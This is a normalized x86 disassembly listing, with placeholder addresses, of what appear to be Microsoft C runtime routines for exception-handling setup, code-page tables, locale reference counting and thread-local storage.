push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_100154ac
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_100154ac
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_100148a0
push sub_10014900
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10014900
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10012771
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10012771
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10017d2b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10017ce2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10012771
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10012771
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10017d12
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10017d2b
mov eax [ ebp + 0xc ]
push r--data
call sub_10018160
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10012771
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10017cf9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10012771
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_10014a8f
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10014abe
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10018220
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10014b22
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_100185ae
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10018481
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10018481
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10018220
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10014cb2
push 0xc
push r--data
call sub_100148a0
call sub_1001565c
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10014d4d
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_100148e5
retn
push 0x20
call sub_10014880
cmp esi rw-data
je r-xdata
push esi
call sub_100134fd
pop ecx
sub_10014d56
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_10013009
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10014dd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10014d56
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10014abe
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10018220
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10012771
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10014a8f
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_10014b22
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10018220
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10014a8f
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_10014fbb
push 0x14
push r--data
call sub_100148a0
or [ ebp - 0x20 ] 0xffffffff
call sub_1001565c
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10014cb2
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10014d56
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_100144c6
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_100148e5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_10014dd2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_10015c7f
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_100134fd
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_100134fd
pop ecx
push 0xd
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001511c
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_100134fd
pop ecx
sub_10015173
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10015202
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1001529b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_100134fd
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_100134fd
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_100134fd
push [ esi + 0xc0 ]
call sub_100134fd
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_100185ee
push [ esi + 0xd4 ]
call sub_100134fd
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_100134fd
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100134fd
pop ecx
push [ esi + 0xb0 ]
call sub_100134fd
push [ esi + 0xbc ]
call sub_100134fd
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100134fd
push [ esi + 0xbc ]
call sub_100189ce
pop ecx
pop ecx
push eax
call sub_100134fd
pop ecx
push eax
call sub_100134fd
push [ esi + 0xbc ]
call sub_10018965
pop ecx
pop ecx
sub_100153e6
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10015173
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10015202
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1001529b
pop ecx
sub_10015433
push 0xc
push r--data
call sub_100148a0
call sub_1001565c
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_100153e6
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100154a0
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1001565c
mov esi [ eax + 0x6c ]
mov eax esi
call sub_100148e5
retn
push 0x20
call sub_10014880
sub_100154be
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_100154f2
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_100134fd
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001552f
push 0x8
push r--data
call sub_100148a0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100155d1
push 0xc
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10015173
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100155da
call sub_100148e5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100155e3
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_100154be
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1001450b
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_100134fd
pop ecx
xor esi esi
push 0x0
push esi
call sub_1001552f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10015676
push 0x8
push r--data
call sub_100148a0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100148e5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_100134fd
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_100134fd
pop ecx
push 0xd
call sub_10017bb6
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_100134fd
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10015790
push 0xc
call sub_10017bb6
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001579c
push esi
call sub_100134fd
pop ecx
push edi
call sub_10015202
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_100134fd
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1001529b
pop ecx
sub_100157a5
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_10015676
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_10015813
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_100154f2
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_100154b5
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1001462d
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_10017a3c
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_100154f2
mov edi [ DecodePointer@IAT ]
push sub_10015676
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1001450b
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1001552f
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1001598e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10013009
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10015c7f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10018acc
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
